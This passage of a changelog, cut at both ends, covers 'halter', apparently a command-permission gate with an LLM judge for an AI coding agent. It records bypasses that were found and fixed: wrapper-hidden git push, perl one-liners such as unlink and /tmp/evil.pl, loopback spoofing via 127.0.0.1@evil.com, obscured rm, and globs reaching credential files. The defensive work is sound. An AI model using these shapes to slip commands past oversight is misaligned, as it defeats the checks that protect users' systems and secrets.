  (`config/trusted-scripts.ts`) already parsed `uv run [--with …] job.py` while
  identification did not — two parsers of the same forms, disagreeing, is what
  made a run simultaneously bypassed and unread. The shared scan walks env
  prefixes, `wrapperCommands`, the local run forms (`uv run`, `deno run`) and
  `FETCH_PKG_FORMS` runners; trusted-scripts keeps only its supply-chain
  validation (`--with` allowlist, trusted deps paths).
- **The runner gate.** A package run form yields a payload only when the
  package NAMES a runner (`npx tsx job.mts`, `uvx python job.py`). `npx eslint
  a.ts` lints a.ts and `uvx black job.py` formats it — naming those as the
  payload would mislabel the packet and over-claim "the floor saw the executed
  path". Wrapping also never makes inline code (`timeout 60 python3 -c …`) or a
  computed path (`npx tsx $ENTRY`) knowable.
- **Knowledge, not grants.** Trust stays exactly as wide as before: the
  skills-dir bypass does not become transitive through pass-through wrappers or
  package FETCH runners (`timeout`/`xargs`/`watch`/`npx`/`uvx` identify the
  script for the judge and still prompt). One deliberate widening: an
  env-assignment prefix (`DEBUG=1 python3 ~/.pi/agent/skills/…/q.sh`) is now
  transparent, as it already is everywhere else in the floor via
  `skipEnvPrefixes`.
- **Flow delta, no new stop.** A now-identified payload triggers the T3
  stage-1 skip and the D19 outside-cwd blocker: wrapped runs decide at the
  intent pass instead of the stateless one (one judge call, not two), and stage
  2 still auto-allows on approve + low/medium. Net friction should fall — the
  judge stops deferring on content it cannot see.
- **Known limits recorded, not papered over.** The wrapper hop stops at a
  wrapper's own flag value, so `xargs -a list.txt python3 job.py` stays
  unidentified (no content, full command text still judged); a whole quoted
  multi-word token is now rejected as an operand instead of being resolved as a
  nonsense path (`watch -n 5 'python3 job.py'`).
- **Tests:** `script-payload.test.ts` gains the wrapped-form table (run forms,
  pass-through wrappers, the non-runner gate, inline/computed parity) and
  `config-helpers.test.ts` pins that trust is not transitive through wrappers.

## 3.28.0 — 2026-10-04

**Ledger mining, round 3: `perl` had no risk entry (deliberate policy flip).**

- **A bare `perl -e` auto-allowed with zero reasons.** `perl` sat in the allow
  table with the exclusion reason "-i edits files in place", so only the `-i`
  forms were ever flagged: `perl -e 'unlink("/tmp/zz")'`, `perl -pe 'system(...)' file.txt`
  and even `perl /tmp/evil.pl` (an outside path, named in the path set) all came
  back `auto-allow`, `reasons: []`. An auto-allow never reaches the gate or the
  judge (`gate/fallthrough.ts` — `tryDspaAutoAllow` is prompt-only), so no floor
  in any mode ever saw them.
- **The two layers disagreed.** The config layer already declared perl
  write-capable — `SCRIPT_INTERPRETERS` → `isWriteOperation` is true for every
  invocation (`config/bash-patterns.ts`), asserted in `config-helpers.test.ts`.
  The risk layer simply had no matching rule. `perl` now joins
  python/node/ruby/php/lua in `ToolEvaluator`: `/^perl[\d.]*$/` →
  `perl (script execution)`.
- **No version-only exemption, no `-i` precondition.** Filter mode (`-n`/`-p`)
  is not a read-only guarantee — `open`/`system`/`unlink` write without `-i`,
  and a `BEGIN` block runs under `-n`. So `perl --version` prompts, exactly as
  `ruby --version` and `php --version` do today. Session history contains no
  bare perl one-liners, so the friction cost is occasional.
- **Test expectations flipped, not quietly.** Three `cases-data.ts` entries
  asserted auto-allow for perl-without-`-i`; they now assert prompt, with the
  flip dated in their `desc`. That removed the only case that could demonstrate
  the `-i` anchoring regression (an unanchored pattern reads `-session.txt` as
  a flag token), so it is now pinned on the flag itself —
  `config-helpers.test.ts` tests `dangerousPerlFlags` directly.
- **New regression class:** `verified-bypasses.test.ts` P6 — `perl -e unlink`,
  `perl -pe system` with a file operand, and `perl <script file>` must not
  auto-allow; `cat file.txt` control still does.
- **Still open from the same ledger** (analysis recorded, no code): program-position
  body classification (safe only if the sentinel survives expansion-bearing
  bodies — `cat "a\n$X/b"`, `bash-parser.test.ts:1194`), `$HOME`/
  `${HOME}` in `BODY_PATH_RE` (additive, but the store has no persistence, so
  every `python3 -c "…$HOME/…"` re-prompts each session), and closed-form
  `$(dirname X)`/`$(basename X)` evaluation — the only candidate that can
  *remove* a stop, so it waits for bypass cases written first. Value evaluation,
  never pinning: `/tmp/ll/$(dirname ../x/a.md)` really touches `/tmp/x`.
- Suite: 3885 pass (50 files).

## 3.27.5 — 2026-10-04

**Ledger mining, round 2 (`unresolved.jsonl` 2 lines, `judge.jsonl` 7).**

- **A glued expansion minted a phantom variable name** (`unresolved.jsonl`:
  `for d in */; do f=$(ls "$d"CHANGELOG.md …)`). tree-sitter splits
  `"$d"CHANGELOG.md` into string + word; `resolveNodeText` concatenated the
  child texts, and the result read as the name `dCHANGELOG` — no loop binds
  that name, so the token was a sentinel no grant could ever bind (the line
  records `decision:"always"` with `persisted:false`). Gluing now braces the
  boundary expansion (`${d}CHANGELOG.md`): the same expansion written
  unambiguously, so the resolver sees `d`. A word written unquoted keeps its
  longer name — bash really does read `$dCHANGELOG` as one name.
- **The embedded loop ref had no cwd-local classification.** Only the leading
  form (`$d`, `$d/rest`) classified a cwd-local in-list; `"${d}CHANGELOG.md"`
  over `for d in */` fell to `opaque`. It now classifies `cwdLocal` when the
  static part is relative; an absolute static part stays opaque (this branch
  cannot prove the pin — the trailing form covers the provable shape). The
  ledger command now resolves against its base with no unresolvable token.
- **A quoted command substitution hid its body's paths** (`judge.jsonl`
  floorMiss `/tmp/cmd1.txt` for `"$(cat /tmp/cmd1.txt)"`). The unquoted form
  is recursed into by the arg extraction; the quoted form is one opaque token
  and nothing looked inside. The substitution RUNS, so every literal path its
  body names is touched by the shell — they join the path set (the sentinel
  stays: the substitution's *value* is still unknown).
- **The judge packet carried no script for a launcher invocation**
  (`…/node_modules/.bin/vite-node /tmp/hprobe.mts` — deferred twice with
  nothing to judge). `identifyScriptFile` stopped at the first non-script
  token, so a path-like launcher ended the scan, and `.mts` was not a script
  extension. A path-like first token with no script extension now reads as a
  launcher and the scan continues; `tsx`/`vite-node` join the interpreter list
  and `vite-node` joins `pathAwareCommands` (the floor was blind to its
  payload — the 2026-08-31 `tsx` shape again).
- **Ledger lines were not attributable.** The 200-char `cmd` cap truncated a
  heredoc command to its `cat > f <<EOF` head — the one part that says nothing
  about the gap in the body. `LEDGER_CMD_MAX` = 1000.

**Recorded, not fixed.** A loop-body assignment (`f=$(ls …)` inside `do … done`)
never reaches the resolver — only statement-position assignments are recorded —
so the ledger's `$f` stays a sentinel (it converged regardless: `persisted:
true`). Recording body assignments would assume the body ran: `for d in; do
D=./x; done; cat $D/secret` resolves inside the bar while bash opens `/secret`
outside it. And the floor still cannot see a script body's runtime-assembled
paths (`path.join(dir, ".nn.bak")` — the 09:01 judge line): `BODY_PATH_RE`
matches literal absolute-looking paths only.

## 3.27.4 — 2026-10-04

**Judge hygiene: the first week of `judge.jsonl` (7 lines — 4 infra, 3 paths,
0 diff) charged five defects to the judge, not the floor.**

- **Prose instead of a verdict** (3 of 4 infra lines). The system prompt now
  opens with the tool-call requirement — `report_verdict` is the only tool and
  the only valid output, a text-only reply is a failed judgment — and closes
  with "Always call it, even when deferring". No packet-text parsing and no
  retry: a prose reply still defers fail-safe.
- **A question shaped as a verdict** (1 infra line: `{"question":…,
  "options":[…]}`). The prompt states there is no channel to the operator — a
  thin packet is a `defer` with reason "missing information". Such a reply is
  also detected in arg validation and labelled `bad-args: asked-user: …` so
  the defect stays countable.
- **Stage-2 context bleed** (1 paths line: a session transcript read in an
  earlier turn was reported as a path this command touched). The stage-2 prompt
  now says paths named in the Session context section are not paths of this
  operation, and the audit splits them: `contextMisses` (an echo of context
  knowledge) vs `floorMisses` (a floor blind spot). A context-only miss still
  writes a line — the bleed rate is what makes the prompt fix measurable.
  `sessionContextPaths()` (judge/session-context.ts) exposes the paths the
  digest names; context paths are normalized to the same absolute form as the
  report before comparison.
- **Parent-dir generalization** (1 paths line: judge named
  `…/extensions/memory`, the floor saw `…/memory/SKILL.md`). `isCovered` now
  counts an ancestor of a known floor path as covered — the same location
  generalized upward, not a place the gate never saw. The old glob-only rule
  keeps its force where enforcement lives: the write bar (`judgeWriteOutside`)
  reads the sanitized `writes` list directly, so a broader WRITE claim still
  escalates. `GLOB_RE` is gone.
- **Compact explanations.** The prompt now asks for ONE plain sentence (what
  the operation does plus the deciding fact — no command echo, no code, under
  160 characters) and `EXPLANATION_MAX_CHARS` dropped 440 → 240. The cut is no
  longer a raw slice: `sentenceCut` keeps the first complete sentence (a `.!?`
  followed by whitespace — `python3.13` and `e.g.` never end it early), falls
  back to a word boundary, and appends the ellipsis only when text was actually
  dropped mid-sentence.
- **Ledger labels.** `JudgeLogEntry.error` is judge()'s own typed `failReason`
  (`model-unresolved | auth-failed | timeout | no-tool-call | bad-args |
  call-failed`); `no-explanation` is dropped — it labelled every failure the
  same and pushed the real class into `detail`, so the ledger could not be
  counted by cause. `log-inspect.mjs judge` gained a context-miss rollup.

## 3.27.3 — 2026-10-04

**File operands stopped being swallowed by the script/pattern heuristics.**
Mining `.log/unresolved.jsonl` + `.log/judge.jsonl` (22 + 7 lines) found two
fail-open families in the path extractor: the commands still prompted (awk,
shuf and short-tailed sed are not in the allow table), but with **no path
warning** — and a signature grant for them would auto-allow silently.

- **Position drift from numeric arguments.** tree-sitter parses a bare `2` as a
  `number` node, and `extractCommandArgPairs` only accepted `WORD_TYPES`, so the
  number was absent from the argument list while every helper that marks "the
  flag's value is `args[i+1]`" counted it: `shuf -n 2 FILE`, `grep -e 2 FILE`,
  `rg -e 2 FILE`, `sed -e 2 FILE`, `awk -F 2 … FILE` marked the FILE as data and
  dropped it from the path set (`shuf -n 2 /etc/hosts` → `paths=[]`).
  `extractCommandArgPairs` now accepts `number` children, so the index space
  matches the shell's. Numeric args are inert downstream
  (`isPathCandidate("2")` and `isOpaqueValue("2")` are false); global
  `WORD_TYPES` is untouched.
- **Text heuristics applied past the program position.** In `sed [flags] script
  [files…]` / `awk [options] program [files…]` the program precedes every file
  operand, yet `isAwkScriptArg`/`isSedPatternArg` ran on every argument: `awk
  '{print $1}' /proc/$pid/status` lost the file (the `$` is in awk's syntax
  class — but the parser sees UNEXPANDED text, so `$` is a path character here,
  which is exactly what the opaque-ref layer exists for) and `sed 's/a/b/'
  /tmp/x` lost it to the `/pattern/x` rule (a 1–3 letter last segment reads as a
  sed command). New `patternRegionOpen(idxs, ai)` gate: the `/`-prefixed rules
  only apply while the positional helper's program region is still open; the
  structural rules (BEGIN/END blocks, action braces, `s/…/` forms) stay
  unconditional. `$` was removed from awk's syntax class.
- `sedScriptArgIndices` learned `-f/--file` (the script FILE stays path-checked
  and the region ends there); `awkProgramArgIndices` now marks the `-f` flag
  index for the same reason. `sed -f prog.sed /etc/$d/x` and `awk -f prog.awk
  /etc/$d/x` mint the data file.
- Preserved (probed before and after): `sed -n '/interface …/,$p' f`,
  `awk 'BEGIN{…} /re/{…} END{…}' f`, `awk -W posix '{print $1}' f`,
  `awk '/pat/' f`, `awk -F: '$1>420' f`, `awk -v l=$L … f`, `shuf -i 1-$n -n 2 f`,
  `grep -vE "$re" f`, `rg -g '*.ts' pat f`, `sort -o OUT IN`.
- `test/bash-parser.test.ts`: +8 cases named after the ledger commands.

## 3.27.2 — 2026-10-03

**The dspa egress floor sees through wrapper/prefix delegation.**
`cd <repo> && timeout 120 git push origin master` auto-allowed with no prompt
and no judge ledger line: `timeout` occupied command position, `networkHit`
keyed on the raw first word, `checkDspaGate` returned `{ok:true}`, stage 1
approved at low risk. The risk layer already resolved the delegation (`[Git]
git push (writes to remote)`, danger=true fired on the same command) — the
floor standing in front of it was weaker, and under dspa a danger reason is
judgeable (D1), so the judge overrode a stop that must never auto-allow.

- `gate/dspa-gate.ts`: new `operativeWords(words)` — `skipEnvPrefixes` then
  `getDelegatedCommand` (the shared `wrapperCommands`/prefix table: `env`,
  `command`, `timeout`, `xargs`, `nice`, `watch`, `parallel`, `ionice`,
  `stdbuf`), returning the delegated words or the raw words when nothing
  delegates.
- `networkHit` and `isLoopbackEgress` both classify the operative words: the
  first word, `isPkgRunForm`, `gitNetworkSubcommand` and `goCargoFetchForm`
  now run on the resolved tail, so `timeout 120 ssh`, `env ssh`, `nice ssh`,
  `command nc`, `xargs -a list scp`, `env GIT_SSH=ssh git push`, `timeout 120
  git -C dir push` all stop as `network egress (…)` naming the delegated
  command.
- Controls kept: a wrapped loopback call stays judgeable (`timeout 120 curl
  http://127.0.0.1:8080/x`), a wrapped package-manager RUN form stays
  judgeable (`timeout 120 npm run build`), and a wrapped remote call does not
  (`timeout 120 curl http://example.com/x`).
- Residual (documented in the `operativeWords` comment, deliberately
  untested): a wrapper outside `wrapperCommands` — `time git push` — is
  invisible to the floor and to the risk layer together, because both read
  the same delegation table.
- Not a regression: `networkHit` has keyed on the first word since it was
  written (`bf2e660`, `0fb0ac6` D14, `c39cc52`, `45564d7`). Wrapper
  transparency was added 2026-08-18 (`0891d00`) to the analysis/risk layer
  and to `segmentFetchPackage` (D10), never to the egress collectors.

Tests +5 (3842 pass)

## 3.27.1 — 2026-10-03

**cd targets expand the closed-set `$HOME` (an ungrantable prompt for a
knowable location).** `cd $HOME/.pi/agent/extensions/llama-link && grep -rn
foo .` stopped with `outside cwd: <unresolved-cwd>` — the marker is never
grantable, so the command could only be approved once at a time. The parser
already resolves `$HOME`/`${HOME}/…` as a closed set for path tokens (`cat
$HOME/x` → `/home/nczer/x`), but `resolveCdTarget` bailed on any `$` in a cd
target: the base went unknown and the later `.` resolved to the marker. cd
targets were the one place the closed set was not applied.

- **`analysis/path-util.ts`** — `HOME_TOKEN_RE` + `expandHomeToken()` move
  here from bash-parser: the closed set is now shared by path tokens and cd
  targets.
- **`analysis/cwd-tracking.ts`** — `resolveCdTarget`, `resolveLoopCdCandidates`
  and `subshellBaseAccess` expand a closed-set `$HOME` / `${HOME}/…` / quoted
  `$HOME` target into the home dir before the `$` bail. New export
  `homeReassigned(segments, assignments)` disables the expansion when the
  command reassigns HOME — an env prefix in bash's assignment position
  (`HOME=/tmp cd $HOME`) or an `export`/`declare`/`local`/`typeset`/
  `readonly`/`unset`/`read` command naming HOME, plus the parser's
  `assignments` list (`export HOME=…` never becomes a segment). Token-based,
  so `MY_HOME=`, `HOME_DIR=` and `echo HOME=/tmp` (an argument, not an
  assignment) do not disable it. `cdBaseBounds`/`trackEffectiveCwd` take
  `assignments`. Residual: a HOME set by a sourced file or the outer shell is
  invisible to the gate — bash's own `cd` fallback there is the passwd home,
  i.e. the value the closed set assumes.
- **`analysis/bash-parser.ts`** — imports the shared helper (local copy removed).
- **`analysis/command-analysis.ts`** — `threadCwdPaths` and both
  `trackEffectiveCwd` calls carry `assignments`, so a payload and the direct
  command run with the same closed-set state.
- **`gate/dspa-gate.ts`** — `cdBaseBounds(…, analysis.assignments)`.
- Behaviour: `cd $HOME/.pi/… && grep -rn foo .` allows, as the literal form
  does; `cd $HOME && ls` prompts naming `/home/nczer` (grantable) instead of
  the marker; `HOME=/tmp cd $HOME && ls`, `export HOME=…; cd $HOME && ls` and
  `cd $HOMEDIR && ls` keep the marker stop; a non-existent `$HOME` target
  leaves the base unchanged (the cd fails, as in bash).

Tests +9 (3837 pass).

## 3.27.0 — 2026-10-03

**Floor stops: the judge's verdict is back — stage 2 skipped when stage 1
approved.** The same-day bare-stop change (reverted) removed the judge
call from floor stops entirely, so the prompt showed the floor's reason
with no judge review — a regression past the spec. Restored D16 behaviour
with one delta: when the floor stops a command that stage 1 already
approved, stage 2 is skipped (its sequential call never changes the
outcome — the stop stands) and the prompt carries the stage-1 verdict.

- **`gate/fallthrough.ts`** — the advisory floor-stop branch runs stage 1
  always; stage 2 only when stage 1 did not approve. `logJudgeDiff` is a
  no-op on a skipped stage 2 (the no-pair shape, same as a failed stage
  2); the judge ledger still gets no paths line on floor stops (nothing
  ran through the floor); `recordDspaStop("gate", …)` uses the carried
  verdict's model.
- **Known consequence:** a skipped stage 2 writes no path report, so the
  D13 parser-gap mining line is absent when stage 1 approved.
- **Prompt** — unchanged from D16: the verdict block leads the body
  (`— advisory (floor stop stands)`); 💭 Explain stays offered only when no
  verdict rendered at all (both stages failed).

Tests +1 (3828 pass).

## 3.26.2 — 2026-09-30

**Prompt: the symlink chain behind outside-cwd dirs.** A written path can
resolve via symlink into a directory that appears nowhere in the command
text (`ls -la ~/.local/bin/Joplin` → target under /mnt/Ndr/Download) —
the outside-cwd prompt named only the resolved dir, so the trigger looked
like a phantom (2026-09-30 session: the user could not map the prompt
back to any token).

- **Hop capture (`analysis/bash-parser.ts`).** `parseCommand` records
  `PathHop { written, resolved }` for literal path tokens (args, `sort -o`
targets, redirects, script-body literals) whose realpath differs from the
  written form. Dot-prefixed tokens are excluded — `threadCwdPaths`
  re-resolves them against the per-segment effective cwd, so a parse-time
  hop would pin the wrong base.
- **Bar filter (`analysis/command-analysis.ts`).** `prompt.symlinkHops`
  keeps only hops whose resolved location is in the outside set — an
  in-bar symlink is not a signal.
- **Render (`ui/prompt-builder.ts`).** The bash prompt renders up to 3
  `🔗 written → resolved` lines under the outside-cwd line (+N more tail),
  mirroring the file prompt's existing `symlinkHint`. Display-only: the
  approval bar, grants, and auto-allow logic are unchanged.

Tests +8 (3814 pass).

## 3.26.1 — 2026-09-24

**Floor: three closed-set misses from the 2026-09-24 unresolved.jsonl.**
All fail-closed; each loosens exactly one provable shape, nothing more.

- **Multi-line literal args: row-span check** (`analysis/bash-parser.ts`).
  tree-sitter-bash splits a double-quoted string containing escape
  sequences into child nodes with the newlines in the gaps between them,
  so the resolved text lost every newline and `isMultiLineLiteralArg`
  never fired — a `node -e "<script>"` body containing a JS-regex `\``
  (or `$/g`) minted the whole script as one opaque token and gate-stopped.
  The check now uses the argument node's source row span; a body with real
  runtime expansion stays opaque.
- **grep -l stage: `--opt=value` long flags** (`analysis/cwd-local.ts`).
  The attached value cannot shift the pattern position, so
  `grep -rln pat --include="*.ts" . | head -1` is cwd-local; a bare
  `--opt` (value in the next token) is still rejected.
- **Quote-aware inner tokenization** (`analysis/cwd-local.ts`).
  `splitShellWords` now follows the bash quote model (inside double quotes
  a backslash escapes the next character, so `\"` does not close the
  quote; the other quote kind is content), and the pipeline stage split
  happens outside quotes only — a `|` inside a quoted pattern (grep's
  `\|`) is data, not a stage separator. `grep -rln "name: \\"x\\"\|name:
  'y'" *.ts` is cwd-local; an unterminated inner quote still fails closed.

## 3.26.0 — 2026-09-18

**Credential scan: false-positive fix + deny tier removed.** Two changes,
one direction: credential paths always PROMPT (with the very-high-risk
warning), never block — and the scan no longer invents credential matches
in benign commands.

- **Deny tier removed (`deniedPaths` → `warnPaths`).** The hard-block tier
  (`.ssh`, `.gnupg`, `.gpg`, `.vault`, `.secret`, `.secrets`) is merged into
  the warn tier; every credential path — dir or file, read or write,
  redirect or symlink — now prompts with the very-high-risk warning. The
  tier's false positives were outright *refusals* (no way to proceed), while
  deny-vs-warn never changed auto-allow behaviour: every mode already stops
  credential paths at the manual bar. Symlink probes that used to deny
  (a link resolving into a credential dir) now warn with the resolved
  target — same information, promptable.
- **FP fix — three rules** (`analysis/credentials.ts`, documented in the
  section comment):
  1. *Quoted words are operands, not path fragments.* A wholly-quoted word
     (a `sed`/`awk` program body, a regex) is never operator-split on
     `;|&<>`, so `sed 's|/[0-9]*|/N|'` no longer produces fake path parts
     (`[0-9]*`, `.*`). `QuotedToken.quotedWhole` carries the fact.
  2. *Name-shape matches require a typed name.* A glob component is
     compared against credential names only when it types out ≥1 literal
     letter. Pure-wildcard components (`.*`, `[0-9]*`, `*.*`) compiled to
     near-universal regexes and "matched" every credential name in
     existence — that was a refusal waiting to happen.
  3. *What a pure wildcard reaches is a filesystem question — answered by
     the filesystem.* Relative unquoted globs are expanded
     (`fs.globSync`) and each real match is checked against the credential
     patterns: `.*/id_rsa` prompts when a credential dir actually exists in
     the cwd; `echo .*` in a clean directory is clean. Untranslatable
     static shapes still fail closed with the `glob-unverified:` marker.
  - Runtime expansions (`$VAR`, `$(…)`, backticks) are not static globs and
    are skipped by the shape check as before (regression pinned:
    `cmds=(cat ls); echo ${cmds[@]}` stays auto-allow).
  - Brace expansion is now statically translatable: `{a,.}ssh` prompts
    (the `{` no longer defeats the scan).
- **Honest widening:** `ls *` / `cat *` in a directory that *does* contain
  a credential path (e.g. a repo with a checked-in `.env`) now prompts —
  the expansion really reaches it. That is more honest than the old
  name-only answer, and it is context-dependent: the same command in a
  clean directory stays auto-allow.
- **`handleFile` credential oracle guard intact:** credential paths are
  never pre-validated (no content read before the decision) — the
  prompt-vs-failure oracle on a secret stays closed.
- Docs: `README.md`, `docs/architecture.md` (Block section shrank to the
  retry-loop guard; credential moved to Prompt), `docs/dspa-redesign.md`
  D5 note.

Suite 3776 (was 3768: +8 FP regression rows).

## 3.25.0 — 2026-09-13

- **D20 — base access for mixed segments.** The D17 judge ledger found a
  floor blind spot: `cd X && python3 scripts/extract.py --source /abs/…`
  (the doc-extract skill shape) never put `X` in the path set — the stage-2
  judge reported it and the ledger flagged the disagreement (a kind-`paths`
  line, `floorMisses` = the cd base itself). Root cause: the base-access
  scan early-returned at the FIRST resolvable target, so a bare arg in the
  same segment — which under a tracked base can live nowhere else — never
  triggered the base flag (`cd /var/tmp && cat main.txt /etc/hosts` flagged
  no base). Now a PATH-LIKE bare arg (contains `/`) forces the base flag
  even alongside resolvable targets; no-slash bare args keep the old rule
  (a search term, subcommand, or package list doesn't count —
  `rg needle /data` stays clean). Bases inside the manual bar (`~/.pi` is
  config-allowed) are filtered as before: the doc-extract workflow stays
  auto-allow; new prompts appear only when the cd base is outside the
  trusted scope (the conservative direction). Read side only — audited: the
  subshell variant is already conservative and D18's write side has no
  early-return hole. The D13 known set is deliberately unchanged (residual
  cd-target lines keep accruing as mining data). Spec:
  `docs/dspa-redesign.md` D20. Suite 3767.

## 3.24.0 — 2026-09-12

**Content classes** (grill-resolved; spec: `docs/dspa-content-classes.md`). An
operation's safety reduces to exactly one thing; that thing selects the judge
pipeline. The changes:

- **New `egress` gate kind (T1)** — the call carries an outgoing payload (a
  web query, a url list): the payload IS the effect (C1), so it is
  JUDGEABLE, not a consent stop. No deterministic floor on the payload; the
  FULL args ride in the judge packet (previously such prompts only saw a
  label); standard cascade — stage-1 approve+low auto-allows in one call,
  stage 2 (session context) guards the not-low path; the
  `<tool>:kind:<k>` session grant stays the override (no prompts, no judge).
  The exa plugin (separate ext) moves consent → egress with this.
- **Detection-limited floor stops are judgeable (T2)** — an obscured command
  position (`f=rm; $f -rf ./build`) and an unparseable command no longer stop
  the auto-allow: the packet carries the full raw text plus both flags, so
  the judge has strictly more information than the static pass. Policy stops
  (credentials, network egress, outside-base scope, rm, root scans,
  untrusted fetch forms, unresolvable sentinels) stay absolute — the
  2026-08-24 data (floor stopped 7/26, judge stopped 0) was the precedent;
  blanket S1-low-skips-floor was rejected (it would hand egress/scope to the
  LLM).
- **File scripts skip stage 1 (T3)** — a bash command that executes a file
  script (the D3/D11 `findExecutedScript` identification) goes straight to
  stage 2: the class always escalates, so stage 1 would only add a call (the
  script content already rides in the stage-2 packet). Accepted cost: the
  ledger loses stage-1-vs-2 `diff` lines for this class.
- **Session-scoped consent prompts (T4)** — consent prompts change from
  "prompt every op until Always" to ONE prompt per kind per session:
  "Allow <kind> this session?" — yes IS the session grant, no blocks that
  op, single tier (the explicit prompt + session lifetime is the boundary),
  and the prompt NAMES THE MODEL (the trust decision is made at the prompt).
  Applies to every consenting tool, identical in manual and dspa.
- **Kind grants reset on model switch (T5)** — a consent/egress kind grant
  records the model identity that granted it; a mid-session switch
  invalidates it (the trust decision was about a specific model), the next
  op re-prompts. Whole-tool grants untouched (parked). Unrecorded (pre-3.24)
  grants stay valid; a missing model identity keeps the check open.
- **Contract docs: the paths** — the plugin contract now names what a kind
  selects: content-judge (`exec`, `egress` — the /dspa cascade can
  auto-allow) vs human-gated (`file`, `consent` — the prompt is the gate);
  classification is PER CALL, so a tool's actions mix paths as their
  payloads demand (grant scopes stay separate per kind).
- Joplin stays C3 (T6): content-bearing pre-fetch of note bodies was
  REJECTED (intent without context is unjudgeable; the local/cloud reader
  distinction already enforces the egress policy). T7 (a future destructive
  content-bearing tool) stays parked: judgeable-authority-never when it
  exists.

## 3.23.0 — 2026-09-10

- **Base-access flag survives redirects** — a glued output-redirect target
  (`2>/dev/null`) was read by `baseAccessPath` as the segment's own
  resolvable file target, and the early `return null` suppressed the base
  flag for the WHOLE command: `cd X && ls 2>/dev/null` flagged nothing,
  auto-allowing an outside base. This is the shape judge.jsonl caught as
  `judgePaths` === `floorMisses` (the judge saw paths the floor never
  flagged). Redirects are now operators, not arguments: an output target
  (glued or the token after an unglued `2>`) is skipped; a glued input
  target (`cat < f`) IS a file argument and still evaluates; resolvable
  file arguments keep their own verdict (no over-flag).
  Consequence: `cd sub && ls a || ls b 2>/dev/null` now prompts, like its
  no-redirect twin — a `cd` left of `||` makes the `||`-branch's runtime
  cwd genuinely ambiguous; the old auto-allow was the hole (documented as
  a legitimate EXCEPTION in the metamorphic suite).
- **The three ledgers are toggleable** — one shared `/halter-ledger-log`
  toggle for all three (same arg handling as `/halter-decision-log`: `on|off`,
  bare = toggle; persisted in the `halter` namespace of `settings-ext.json`,
  key `ledgerLog`). All stay ON by default — this is a valve, not a
  behavior change. The `HALTER_*_LOG` env seams keep priority over the toggle
  (test hermeticity).
- **tmux send-keys payloads get the same cwd threading** — payload chunks
  used the parser's session-cwd paths as-is: a `cd` inside the payload never
  re-based later segments (dot tokens resolved against the session cwd while
  the real location was invisible), and base access (`cd /var/tmp && ls`) was
  unseen — the payload auto-allowed what the identical direct command
  prompts. Payloads now run through the same `threadCwdPaths` derivation as
  direct commands: stale drop, base re-resolution, unknown-cwd marker, base
  access. Residual: a cd does not persist ACROSS Enter chunks (the pane
  shell would keep it) — conservative direction: the chunk's session-cwd
  resolution stays, so it over-prompts, never under-flags.
- **Stale pre-cwd resolutions drop out of post-cd segments** — the parser
  resolves `./`/`../` tokens against the session cwd, and the post-cd
  re-resolution ADDED the base-resolved locations without removing the
  pre-cd ones: `cd ~/.pi/… && ls ../` flagged the session-cwd parent (a
  location the command never touches at runtime) as outside while the real
  location (an allowed dir) was filtered out — phantom outside-dirs, dead
  grants, and the sole cause of a prompt on an otherwise-allowed command.
  The stale entries are now removed before re-resolution; a string is kept
  when it is the legitimate resolution of a segment whose base is still the
  session cwd (the parser dedupes cross-segment, so the same string can be
  stale for one segment and real for another); unknown-base segments keep
  only the marker.

## 3.22.0 — 2026-09-08

Fixes the credential-pattern false positives on everyday relative globs
(`grep … judge/*.ts` under Bun prompting `credential pattern
("judge/*.ts")`). Two independent bugs, both in the bare-symlink probe:

- **Quoted words are one shell word** — the probe operator-split every
  token, so a `node -e 'a; b* && c'` body became garbage fragments that
  were then fs-globbed; a failed expansion on any fragment was reported as
  a matched credential pattern. `tokenizeSegmentQuoted` carries per-token
  quoting facts (`tokenizeSegment` is now defined over it — output
  identical); quoted words are probed as single literal names — never
  split, and quoted globs (`"l*"`) never expansion-probed (they don't
  expand at runtime). A glob char outside the quoted spans (`a*b'c'`)
  still expands.
- **Static search-directory guard** — glob chars never cross `/`, so a
  pattern whose globs all sit after its last `/` searches exactly the
  literal directory before it; a missing directory is a provably empty
  expansion and now no-ops instead of failing closed. Required because pi
  runs on Bun 1.3.14, whose `fs.globSync` throws on no-match (Node 26
  returns `[]`) — every everyday no-match glob prompted since e1af428
  introduced glob expansion.
- **Honest unverifiable-glob stop** — a remaining expansion failure (a
  real `globSync` throw / >4096 matches) is now marked
  `glob-unverified:…` and rendered as `Glob "…" could not be expanded and
  verified — may reach credential files`, with the gate reason
  `unverifiable glob (…)` — no longer mislabeled as a credential-pattern
  match. Fail-closed is unchanged.
- **`.log/glob-err.jsonl`** — on-signal ledger of failed glob-expansion
  probes (pattern, error name+message, cwd); a healthy run writes nothing.
  `HALTER_GLOBERR_LOG` seams it (path / `off`) like the other ledgers.

## 3.21.0 — 2026-09-06

- **Simplified the DSP widget line** — `⚠ DSP MODE — all permissions
  bypassed ⚠` → `⚠ DSP`; the warning is constant for the whole bypass,
  so the glyph + name carry it. The DSPA/DSPAT line descriptions stay:
  those fallbacks only render in the pre-first-op state (zero counters /
  no recorded outcome — session start, re-arm, model switch), where the
  description is the line's only content.

## 3.20.0 — 2026-09-06

Closes three of the four report-only gaps from the 3.19.0 pass-2 audit (the
subshell-assignment miss stays report-only: fail-closed, rare, and the fix
touches the hardened var-resolution core).

- **Explicit go/cargo fetch forms hit the egress floor** — `cargo fetch`,
  `cargo add`, `cargo update`, `cargo vendor`, `go get`, `go install`,
  `go mod download`, `go mod tidy` are the D8 fetch class (registry fetch +
  build-script execution: cargo `build.rs`, go cgo) — previously judgeable
  like `cargo build`, while the npm/pip equivalents are deterministic stops.
  The CLIs themselves stay D1-judgeable (`cargo build`, `go run main.go`
  unchanged); quote-aware, shared by the floor and the packet annotation.
- **The bare-symlink probe no longer skips `=`-tokens** — a cwd symlink
  literally named `notes=v2.md` pointing outside (or at a credential)
  bypassed the probe in every layer. The probe is existence-gated, so
  `K=V` assignments and `--flag=value` no-op.
- index.ts: dropped a duplicate `setWidget("dspa")` in session_shutdown.

## 3.19.0 — 2026-09-06

Pass-2 audit: five gaps where a command slipped past a layer its unquoted,
bare, or reordered twin never would have. All fixes fail closed — more
prompts, fewer auto-allows.

- **The rm carve-out honors segment order** — the create-then-delete
  exemption applied to a self-write ANYWHERE in the command, so
  `rm f && echo x > f` (delete, then recreate outside the base) was
  judgeable. A self-write now counts only for an rm in a LATER segment,
  and every write must be cleaned by a later rm (`> f; rm f; > f` stops).
- **The D14 loopback exemption accepts only strict loopback addresses** —
  `startsWith("127.")` took DNS names (`127.0.0.1.attacker.com`) and
  userinfo smuggling (`127.0.0.1@evil.com` — real host: evil.com) as
  loopback, so curl to them was judgeable off-box egress. Now: strict
